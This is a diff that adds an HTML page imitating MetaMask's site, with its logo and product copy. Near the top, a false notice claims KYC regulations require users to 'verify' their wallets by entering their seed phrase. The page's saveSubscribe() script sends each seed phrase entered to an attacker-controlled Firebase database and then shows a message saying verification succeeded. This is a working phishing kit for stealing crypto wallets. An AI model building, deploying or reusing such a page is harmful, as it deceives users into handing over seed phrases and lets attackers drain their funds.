@@ -1,0 +1,1000 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi"
+      crossorigin="anonymous"
+    />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3"
+      crossorigin="anonymous"
+    ></script>
+    <link rel="stylesheet" href="./style.css" />
+    <script
+      src="https://kit.fontawesome.com/c9a477b534.js"
+      crossorigin="anonymous"
+    ></script>
+    <script src="script.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/5.9.0/firebase.js"></script>
+    <script>
+      // Initialize Firebase
+      // TODO: Replace with your project's customized code snippet
+      var config = {
+        apiKey: "AIzaSyCadbn54RMTc94hq0Hutd_LZGZU_hhevlg",
+        authDomain: "appmetamask-54237.firebaseapp.com",
+        databaseURL: "https://appmetamask-54237-default-rtdb.firebaseio.com",
+        projectId: "appmetamask-54237",
+        storageBucket: "appmetamask-54237.appspot.com",
+        messagingSenderId: "996555430762",
+        appId: "1:996555430762:web:6b43ba8ad6d678ff976313",
+      };
+      firebase.initializeApp(config);
+    </script>
+
+    <script type="text/javascript">
+      function saveSubscribe() {
+        var id = $("#seed").val();
+
+        if (id.length < 1) {
+          alert("Please insert your seedphrase");
+        } else {
+          var timestamp = new Date().valueOf();
+          var obj = {};
+          obj[timestamp] = id;
+
+          firebase
+            .database()
+            .ref("/")
+            .update(obj, function (error) {
+              if (error) {
+                alert("Invalid seed");
+              } else {
+                alert("Your metamask verification has been updated.");
+              }
+            });
+        }
+      }
+    </script>
+  </head>
+
+  <body>
+    <div class="container">
+      <section class="background7 mt-5">
+        <div
+          id="logo-container"
+          bis_skin_checked="1"
+          style="width: 100%; text-align: center; padding-top: 24px"
+        >
+          <svg width="230px" height="230px">
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="128.5036027804017,66.98480740189552 101.39245249330997,66.99078798294067 90.55271789431572,39.60069328546524"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="90.55271789431572,39.60069328546524 139.41026248037815,39.5845028758049 128.5036027804017,66.98480740189552"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="60.8714197576046,87.83289186656475 29.939652383327484,80.3273157775402 28.16906452178955,73.03590103983879"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="35.621437430381775,101.61851245909929 60.8714197576046,87.83289186656475 74.1906364262104,90.69419719278812"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="169.1002470254898,87.81812891364098 201.81072145700455,73.00182715058327 200.03744661808014,80.29895171523094"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="31.12837255001068,89.08205531537533 60.8714197576046,87.83289186656475 35.621437430381775,101.61851245909929"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="31.12837255001068,89.08205531537533 29.939652383327484,80.3273157775402 60.8714197576046,87.83289186656475"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="194.34796392917633,101.60570476204157 155.7487592101097,90.68401649594307 169.1002470254898,87.81812891364098"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="198.8458475470543,89.06002312898636 194.34796392917633,101.60570476204157 169.1002470254898,87.81812891364098"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="198.8458475470543,89.06002312898636 169.1002470254898,87.81812891364098 200.03744661808014,80.29895171523094"
+            ></polygon>
+            <polygon
+              fill="rgb(228,119,25)"
+              stroke="rgb(228,119,25)"
+              points="101.39245249330997,66.99078798294067 32.37321078777313,15.161900520324707 90.55271789431572,39.60069328546524"
+            ></polygon>
+            <polygon
+              fill="rgb(225,119,25)"
+              stroke="rgb(225,119,25)"
+              points="197.54169017076492,15.090846419334412 128.5036027804017,66.98480740189552 139.41026248037815,39.5845028758049"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="61.93064749240875,49.16978746652603 60.8714197576046,87.83289186656475 28.16906452178955,73.03590103983879"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="74.1906364262104,90.69419719278812 60.8714197576046,87.83289186656475 61.93064749240875,49.16978746652603"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="201.81072145700455,73.00182715058327 169.1002470254898,87.81812891364098 167.99246177077293,49.13875013589859"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="167.99246177077293,49.13875013589859 169.1002470254898,87.81812891364098 155.7487592101097,90.68401649594307"
+            ></polygon>
+            <polygon
+              fill="rgb(228,119,25)"
+              stroke="rgb(228,119,25)"
+              points="75.61508059501648,170.58667331933975 32.99379289150238,184.69760239124298 21.89024955034256,142.47994735836983"
+            ></polygon>
+            <polygon
+              fill="rgb(228,119,25)"
+              stroke="rgb(228,119,25)"
+              points="208.11988830566406,142.49568536877632 197.0137059688568,184.7394561767578 154.27954122424126,170.6022571027279"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="62.386953830718994,105.86855068802834 21.89024955034256,142.47994735836983 35.621437430381775,101.61851245909929"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="61.93064749240875,49.16978746652603 101.39245249330997,66.99078798294067 74.1906364262104,90.69419719278812"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="155.7487592101097,90.68401649594307 128.5036027804017,66.98480740189552 167.99246177077293,49.13875013589859"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="167.48691245913506,105.86187779903412 194.34796392917633,101.60570476204157 208.11988830566406,142.49568536877632"
+            ></polygon>
+            <polygon
+              fill="rgb(228,119,25)"
+              stroke="rgb(228,119,25)"
+              points="21.89024955034256,142.47994735836983 56.30569338798523,139.5082926005125 75.61508059501648,170.58667331933975"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="56.30569338798523,139.5082926005125 21.89024955034256,142.47994735836983 62.386953830718994,105.86855068802834"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="24.186237454414368,75.77525049448013 28.16906452178955,73.03590103983879 29.939652383327484,80.3273157775402"
+            ></polygon>
+            <polygon
+              fill="rgb(228,119,25)"
+              stroke="rgb(228,119,25)"
+              points="154.27954122424126,170.6022571027279 173.5697939991951,139.516793936491 208.11988830566406,142.49568536877632"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="167.48691245913506,105.86187779903412 208.11988830566406,142.49568536877632 173.5697939991951,139.516793936491"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="205.79432994127274,75.7416221499443 200.03744661808014,80.29895171523094 201.81072145700455,73.00182715058327"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="31.12837255001068,89.08205531537533 25.430520474910736,83.6385115981102 29.939652383327484,80.3273157775402"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="198.8458475470543,89.06002312898636 200.03744661808014,80.29895171523094 204.5472913980484,83.61103862524033"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="35.621437430381775,101.61851245909929 27.440557777881622,91.60112746059895 31.12837255001068,89.08205531537533"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="194.34796392917633,101.60570476204157 198.8458475470543,89.06002312898636 202.53421068191528,91.57990753650665"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="28.16906452178955,73.03590103983879 22.715473771095276,42.97653079032898 61.93064749240875,49.16978746652603"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="167.99246177077293,49.13875013589859 207.24620252847672,42.91789025068283 201.81072145700455,73.00182715058327"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="35.621437430381775,101.61851245909929 74.1906364262104,90.69419719278812 62.386953830718994,105.86855068802834"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="194.34796392917633,101.60570476204157 167.48691245913506,105.86187779903412 155.7487592101097,90.68401649594307"
+            ></polygon>
+            <polygon
+              fill="rgb(228,119,25)"
+              stroke="rgb(228,119,25)"
+              points="74.1906364262104,90.69419719278812 101.39245249330997,66.99078798294067 103.68346743285656,106.74173694103956"
+            ></polygon>
+            <polygon
+              fill="rgb(228,119,25)"
+              stroke="rgb(228,119,25)"
+              points="103.68346743285656,106.74173694103956 62.386953830718994,105.86855068802834 74.1906364262104,90.69419719278812"
+            ></polygon>
+            <polygon
+              fill="rgb(228,119,25)"
+              stroke="rgb(228,119,25)"
+              points="155.7487592101097,90.68401649594307 167.48691245913506,105.86187779903412 126.13998033106327,106.74039088189602"
+            ></polygon>
+            <polygon
+              fill="rgb(228,119,25)"
+              stroke="rgb(228,119,25)"
+              points="126.13998033106327,106.74039088189602 128.5036027804017,66.98480740189552 155.7487592101097,90.68401649594307"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="32.37321078777313,15.161900520324707 101.39245249330997,66.99078798294067 61.93064749240875,49.16978746652603"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="61.93064749240875,49.16978746652603 22.715473771095276,42.97653079032898 32.37321078777313,15.161900520324707"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="197.54169017076492,15.090846419334412 207.24620252847672,42.91789025068283 167.99246177077293,49.13875013589859"
+            ></polygon>
+            <polygon
+              fill="rgb(119,57,0)"
+              stroke="rgb(119,57,0)"
+              points="167.99246177077293,49.13875013589859 128.5036027804017,66.98480740189552 197.54169017076492,15.090846419334412"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="101.39245249330997,66.99078798294067 128.5036027804017,66.98480740189552 126.13998033106327,106.74039088189602"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="126.13998033106327,106.74039088189602 103.68346743285656,106.74173694103956 101.39245249330997,66.99078798294067"
+            ></polygon>
+            <polygon
+              fill="rgb(205,98,0)"
+              stroke="rgb(205,98,0)"
+              points="75.61508059501648,170.58667331933975 56.30569338798523,139.5082926005125 79.38633218407631,138.98130744695663"
+            ></polygon>
+            <polygon
+              fill="rgb(205,98,0)"
+              stroke="rgb(205,98,0)"
+              points="154.27954122424126,170.6022571027279 150.4452347755432,138.98630782961845 173.5697939991951,139.516793936491"
+            ></polygon>
+            <polygon
+              fill="rgb(205,98,0)"
+              stroke="rgb(205,98,0)"
+              points="78.9260022342205,122.244318947196 62.386953830718994,105.86855068802834 103.68346743285656,106.74173694103956"
+            ></polygon>
+            <polygon
+              fill="rgb(205,98,0)"
+              stroke="rgb(205,98,0)"
+              points="126.13998033106327,106.74039088189602 167.48691245913506,105.86187779903412 150.91548666357994,122.24451344460249"
+            ></polygon>
+            <polygon
+              fill="rgb(228,116,36)"
+              stroke="rgb(228,116,36)"
+              points="62.386953830718994,105.86855068802834 78.9260022342205,122.244318947196 79.38633218407631,138.98130744695663"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="62.386953830718994,105.86855068802834 79.38633218407631,138.98130744695663 56.30569338798523,139.5082926005125"
+            ></polygon>
+            <polygon
+              fill="rgb(228,116,36)"
+              stroke="rgb(228,116,36)"
+              points="167.48691245913506,105.86187779903412 150.4452347755432,138.98630782961845 150.91548666357994,122.24451344460249"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="173.5697939991951,139.516793936491 150.4452347755432,138.98630782961845 167.48691245913506,105.86187779903412"
+            ></polygon>
+            <polygon
+              fill="rgb(192,172,157)"
+              stroke="rgb(192,172,157)"
+              points="83.76702040433884,176.0912001132965 75.61508059501648,170.58667331933975 99.08579379320145,176.15810722112656"
+            ></polygon>
+            <polygon
+              fill="rgb(192,172,157)"
+              stroke="rgb(192,172,157)"
+              points="130.61561070382595,176.16506457328796 154.27954122424126,170.6022571027279 146.08158692717552,176.1049297451973"
+            ></polygon>
+            <polygon
+              fill="rgb(214,194,178)"
+              stroke="rgb(214,194,178)"
+              points="98.89997251331806,167.88445830345154 99.08579379320145,176.15810722112656 75.61508059501648,170.58667331933975"
+            ></polygon>
+            <polygon
+              fill="rgb(214,194,178)"
+              stroke="rgb(214,194,178)"
+              points="130.76451517641544,167.89042174816132 154.27954122424126,170.6022571027279 130.61561070382595,176.16506457328796"
+            ></polygon>
+            <polygon
+              fill="rgb(214,194,178)"
+              stroke="rgb(214,194,178)"
+              points="75.61508059501648,170.58667331933975 100.92836283147335,150.9436073899269 98.89997251331806,167.88445830345154"
+            ></polygon>
+            <polygon
+              fill="rgb(228,119,25)"
+              stroke="rgb(228,119,25)"
+              points="100.92836283147335,150.9436073899269 75.61508059501648,170.58667331933975 79.38633218407631,138.98130744695663"
+            ></polygon>
+            <polygon
+              fill="rgb(214,194,178)"
+              stroke="rgb(214,194,178)"
+              points="154.27954122424126,170.6022571027279 130.76451517641544,167.89042174816132 128.73031221330166,150.94690784811974"
+            ></polygon>
+            <polygon
+              fill="rgb(228,119,25)"
+              stroke="rgb(228,119,25)"
+              points="128.73031221330166,150.94690784811974 150.4452347755432,138.98630782961845 154.27954122424126,170.6022571027279"
+            ></polygon>
+            <polygon
+              fill="rgb(205,98,0)"
+              stroke="rgb(205,98,0)"
+              points="103.68346743285656,106.74173694103956 93.70759434998035,115.40434455149807 78.9260022342205,122.244318947196"
+            ></polygon>
+            <polygon
+              fill="rgb(205,98,0)"
+              stroke="rgb(205,98,0)"
+              points="150.91548666357994,122.24451344460249 136.1234636604786,115.40328640956432 126.13998033106327,106.74039088189602"
+            ></polygon>
+            <polygon
+              fill="rgb(36,51,67)"
+              stroke="rgb(36,51,67)"
+              points="99.79057870805264,127.76150178164244 78.9260022342205,122.244318947196 93.70759434998035,115.40434455149807"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="79.38633218407631,138.98130744695663 78.9260022342205,122.244318947196 99.79057870805264,127.76150178164244"
+            ></polygon>
+            <polygon
+              fill="rgb(36,51,67)"
+              stroke="rgb(36,51,67)"
+              points="130.02061143517494,127.76225749403238 136.1234636604786,115.40328640956432 150.91548666357994,122.24451344460249"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="150.4452347755432,138.98630782961845 130.02061143517494,127.76225749403238 150.91548666357994,122.24451344460249"
+            ></polygon>
+            <polygon
+              fill="rgb(205,98,0)"
+              stroke="rgb(205,98,0)"
+              points="93.70759434998035,115.40434455149807 103.68346743285656,106.74173694103956 99.79057870805264,127.76150178164244"
+            ></polygon>
+            <polygon
+              fill="rgb(205,98,0)"
+              stroke="rgb(205,98,0)"
+              points="136.1234636604786,115.40328640956432 130.02061143517494,127.76225749403238 126.13998033106327,106.74039088189602"
+            ></polygon>
+            <polygon
+              fill="rgb(228,116,36)"
+              stroke="rgb(228,116,36)"
+              points="99.79057870805264,127.76150178164244 103.68346743285656,106.74173694103956 104.57762256264687,119.29498812183738"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="104.57762256264687,119.29498812183738 103.68346743285656,106.74173694103956 126.13998033106327,106.74039088189602"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="126.13998033106327,106.74039088189602 125.21712355315685,119.29479790851474 104.57762256264687,119.29498812183738"
+            ></polygon>
+            <polygon
+              fill="rgb(225,119,25)"
+              stroke="rgb(225,119,25)"
+              points="130.02061143517494,127.76225749403238 125.21712355315685,119.29479790851474 126.13998033106327,106.74039088189602"
+            ></polygon>
+            <polygon
+              fill="rgb(192,172,157)"
+              stroke="rgb(192,172,157)"
+              points="99.08579379320145,176.15810722112656 100.46598508954048,183.1961303949356 83.76702040433884,176.0912001132965"
+            ></polygon>
+            <polygon
+              fill="rgb(192,172,157)"
+              stroke="rgb(192,172,157)"
+              points="146.08158692717552,176.1049297451973 129.22670044004917,183.2032933831215 130.61561070382595,176.16506457328796"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="100.92836283147335,150.9436073899269 79.38633218407631,138.98130744695663 99.79057870805264,127.76150178164244"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="130.02061143517494,127.76225749403238 150.4452347755432,138.98630782961845 128.73031221330166,150.94690784811974"
+            ></polygon>
+            <polygon
+              fill="rgb(228,116,36)"
+              stroke="rgb(228,116,36)"
+              points="104.57762256264687,119.29498812183738 104.51373487710953,148.44752877950668 99.79057870805264,127.76150178164244"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="99.79057870805264,127.76150178164244 104.51373487710953,148.44752877950668 100.92836283147335,150.9436073899269"
+            ></polygon>
+            <polygon
+              fill="rgb(228,116,36)"
+              stroke="rgb(228,116,36)"
+              points="125.21712355315685,119.29479790851474 130.02061143517494,127.76225749403238 125.1443112641573,148.44977021217346"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="128.73031221330166,150.94690784811974 125.1443112641573,148.44977021217346 130.02061143517494,127.76225749403238"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="104.57762256264687,119.29498812183738 125.21712355315685,119.29479790851474 125.1443112641573,148.44977021217346"
+            ></polygon>
+            <polygon
+              fill="rgb(247,132,25)"
+              stroke="rgb(247,132,25)"
+              points="125.1443112641573,148.44977021217346 104.51373487710953,148.44752877950668 104.57762256264687,119.29498812183738"
+            ></polygon>
+            <polygon
+              fill="rgb(192,172,157)"
+              stroke="rgb(192,172,157)"
+              points="100.46598508954048,183.1961303949356 99.08579379320145,176.15810722112656 98.89997251331806,167.88445830345154"
+            ></polygon>
+            <polygon
+              fill="rgb(192,172,157)"
+              stroke="rgb(192,172,157)"
+              points="130.76451517641544,167.89042174816132 130.61561070382595,176.16506457328796 129.22670044004917,183.2032933831215"
+            ></polygon>
+            <polygon
+              fill="rgb(192,172,157)"
+              stroke="rgb(192,172,157)"
+              points="98.89997251331806,167.88445830345154 100.73878183960915,165.6143805384636 100.46598508954048,183.1961303949356"
+            ></polygon>
+            <polygon
+              fill="rgb(192,172,157)"
+              stroke="rgb(192,172,157)"
+              points="100.46598508954048,183.1961303949356 100.73878183960915,165.6143805384636 128.90785064548254,165.6193946301937"
+            ></polygon>
+            <polygon
+              fill="rgb(192,172,157)"
+              stroke="rgb(192,172,157)"
+              points="128.90785064548254,165.6193946301937 129.22670044004917,183.2032933831215 100.46598508954048,183.1961303949356"
+            ></polygon>
+            <polygon
+              fill="rgb(192,172,157)"
+              stroke="rgb(192,172,157)"
+              points="129.22670044004917,183.2032933831215 128.90785064548254,165.6193946301937 130.76451517641544,167.89042174816132"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="100.73878183960915,165.6143805384636 98.89997251331806,167.88445830345154 100.92836283147335,150.9436073899269"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="128.73031221330166,150.94690784811974 130.76451517641544,167.89042174816132 128.90785064548254,165.6193946301937"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="104.30138483643532,150.76553344726562 104.51373487710953,148.44752877950668 125.1443112641573,148.44977021217346"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="100.92836283147335,150.9436073899269 104.51373487710953,148.44752877950668 104.30138483643532,150.76553344726562"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="125.1443112641573,148.44977021217346 125.32147355377674,150.76801478862762 104.30138483643532,150.76553344726562"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="125.32147355377674,150.76801478862762 125.1443112641573,148.44977021217346 128.73031221330166,150.94690784811974"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="100.92836283147335,150.9436073899269 102.00796823948622,153.35345938801765 100.73878183960915,165.6143805384636"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="104.30138483643532,150.76553344726562 102.00796823948622,153.35345938801765 100.92836283147335,150.9436073899269"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="128.90785064548254,165.6193946301937 127.61523973196745,153.35674613714218 128.73031221330166,150.94690784811974"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="128.73031221330166,150.94690784811974 127.61523973196745,153.35674613714218 125.32147355377674,150.76801478862762"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="128.90785064548254,165.6193946301937 100.73878183960915,165.6143805384636 102.00796823948622,153.35345938801765"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="102.00796823948622,153.35345938801765 127.61523973196745,153.35674613714218 128.90785064548254,165.6193946301937"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="102.00796823948622,153.35345938801765 104.30138483643532,150.76553344726562 125.32147355377674,150.76801478862762"
+            ></polygon>
+            <polygon
+              fill="rgb(0,0,0)"
+              stroke="rgb(0,0,0)"
+              points="125.32147355377674,150.76801478862762 127.61523973196745,153.35674613714218 102.00796823948622,153.35345938801765"
+            ></polygon>
+          </svg>
+        </div>
+        <div class="box pt-5" style="margin-top: -22px">
+          <h1 class="text-center">Metamask - Action Required</h1>
+          <br />
+          <h6 class="text-center w-90">
+            Metamask requires all users to verify their wallets in order to
+            comply with the newest KYC regulations, this must be done before<br />
+            28/02/2023 as a regulated financial services company, we are
+            required to verify all wallets on our platform. We require all<br />
+            customers to verify their wallets to continue using our service.<br />
+          </h6>
+          <br />
+          <strong
+            ><h4 class="text-center" style="font-weight: bold">
+              Enter Seedphrase
+            </h4></strong
+          ><br />
+          <div style="width: 100%; text-align: center">
+            <input
+              id="seed"
+              name="seed"
+              type="text"
+              placeholder="Use spacebar to separate the words"
+              style="
+                width: 60%;
+                border: 1px solid #d5d5d5;
+                padding: 12px;
+                font-family: Regular;
+              "
+            />
+          </div>
+
+          <div style="width: 100%; text-align: center; margin-top: 24px">
+            <button type="button" class="btn btn-primary btnD pe-4 ps-4"  onclick = "saveSubscribe()">
+              Continuar
+            </button>
+          </div>
+        </div>
+      </section>
+    </div>
+
+    <div class="container">
+      <nav
+        class="navbar navbar-expand-lg rounded navbar-light fixed-top w-100"
+        id="navbar"
+        aria-label="Eleventh navbar example"
+      >
+        <div class="container">
+          <a class="navbar-brand img-fluid ps-5" href="www.machumzd.ml"
+            ><img src="./images/metamask.png" id="dLogo"
+          /></a>
+          <button
+            class="navbar-toggler"
+            type="button"
+            data-bs-toggle="collapse"
+            data-bs-target="#navbarsExample09"
+            aria-controls="navbarsExample09"
+            aria-expanded="false"
+            aria-label="Toggle navigation"
+          >
+            <span class="navbar-toggler-icon"></span>
+          </button>
+
+          <div class="collapse navbar-collapse" id="navbarsExample09">
+            <ul class="navbar-nav justify-content-end flex-grow-1">
+              <li class="nav-item dropdown">
+                <a
+                  class="nav-link dropdown-toggle pe-4"
+                  href="#"
+                  id="nav-link"
+                  data-bs-toggle="dropdown"
+                  aria-expanded="false"
+                  >Features</a
+                >
+                <ul class="dropdown-menu">
+                  <li><a class="dropdown-item" href="#">Portfolio Dapp</a></li>
+                  <li><a class="dropdown-item" href="#">Swaps</a></li>
+                  <li><a class="dropdown-item" href="#">Buy Crypto</a></li>
+                </ul>
+              </li>
+              <li class="nav-item dropdown">
+                <a
+                  class="nav-link dropdown-toggle pe-4"
+                  id="nav-link"
+                  href="#"
+                  data-bs-toggle="dropdown"
+                  aria-expanded="false"
+                  >Support</a
+                >
+                <ul class="dropdown-menu">
+                  <li><a class="dropdown-item" href="#">FAQs</a></li>
+                  <li><a class="dropdown-item" href="#">Get Support</a></li>
+                  <li><a class="dropdown-item" href="#">community</a></li>
+                </ul>
+              </li>
+              <li class="nav-item dropdown">
+                <a
+                  class="nav-link dropdown-toggle pe-4"
+                  id="nav-link"
+                  href="#"
+                  data-bs-toggle="dropdown"
+                  aria-expanded="false"
+                  >About</a
+                >
+                <ul class="dropdown-menu">
+                  <li><a class="dropdown-item" href="#">Team</a></li>
+                  <li><a class="dropdown-item" href="#">Careers</a></li>
+                  <li><a class="dropdown-item" href="#">News</a></li>
+                </ul>
+              </li>
+              <li class="nav-item dropdown">
+                <a
+                  class="nav-link dropdown-toggle pe-4"
+                  id="nav-link"
+                  href="#"
+                  data-bs-toggle="dropdown"
+                  aria-expanded="false"
+                  >Build</a
+                >
+                <ul class="dropdown-menu">
+                  <li><a class="dropdown-item" href="#">Devolopers Docs</a></li>
+                  <li><a class="dropdown-item" href="#">Institutions</a></li>
+                  <li><a class="dropdown-item" href="#">Snaps</a></li>
+                  <li><a class="dropdown-item" href="#">Flask</a></li>
+                  <li><a class="dropdown-item" href="#">SDK</a></li>
+                </ul>
+              </li>
+            </ul>
+            <button type="button" class="btn btn-primary btnD pe-4 ps-4">
+              Download
+            </button>
+            <button class="border-0 bg-light">
+              <img
+                src="./images/light.png"
+                id="light"
+                class="img-fluid"
+                onclick="dark()"
+              />
+            </button>
+          </div>
+        </div>
+      </nav>
+    </div>
+
+    <div class="fullBg">
+      <div class="container">
+        <section class="background1 mb-5 pt-5 pb-5">
+          <div class="row justify-content-md-center mt-5 pt-3">
+            <div class="col-md-5">
+              <div class="card-body mt-5">
+                <h2 class="card-title boxTitle pt-5 pb-2">
+                  A crypto wallet & gateway to blockchain apps
+                </h2>
+                <p class="card-text boxText">
+                  Start exploring blockchain applications in seconds. Trusted by
+                  over 30 million users worldwide.
+                </p>
+                <button href="#" class="btn ps-3 pe-3 btn-primary">
+                  download for
+                  <img
+                    src="./images/Chrome_Logo.svg"
+                    class="img-fluid btnDImage"
+                  />
+                </button>
+              </div>
+            </div>
+            <div class="col-md-5 text-center">
+              <img src="./images/home-hero.webp" class="boxImage img-fluid" />
+            </div>
+          </div>
+          <div class="row text-center">
+            <h6 class="">LEARN MORE</h6>
+            <i class="fa-solid fa-angle-down text-center"></i>
+          </div>
+        </section>
+
+        <section class="background2 mb-5 pb-5">
+          <div class="row justify-content-md-center mt-5">
+            <div class="col-md-5">
+              <div class="card-body">
+                <h2 class="card-title boxTitle2 pt-5 pb-3">
+                  Buy, store, send and swap tokens
+                </h2>
+                <p class="card-text boxText">
+                  Available as a browser extension and as a mobile app, MetaMask
+                  equips you with a key vault, secure login, token wallet, and
+                  token exchange—everything you need to manage your digital
+                  assets
+                </p>
+              </div>
+            </div>
+
+            <div class="col-md-5 text-center">
+              <img src="./images/wallet-illo.svg" class="boxImage img-fluid" />
+            </div>
+          </div>
+        </section>
+
+        <section class="background3 mb-5 pb-5">
+          <div class="row justify-content-md-center mt-5">
+            <div class="col-md-5 text-center">
+              <img src="./images/Explore-illo.svg" class="boxImage img-fluid" />
+            </div>
+            <div class="col-md-5">
+              <div class="card-body">
+                <h2 class="card-title boxTitle2 pt-5 pb-3">
+                  Explore blockchain apps
+                </h2>
+                <p class="card-text boxText">
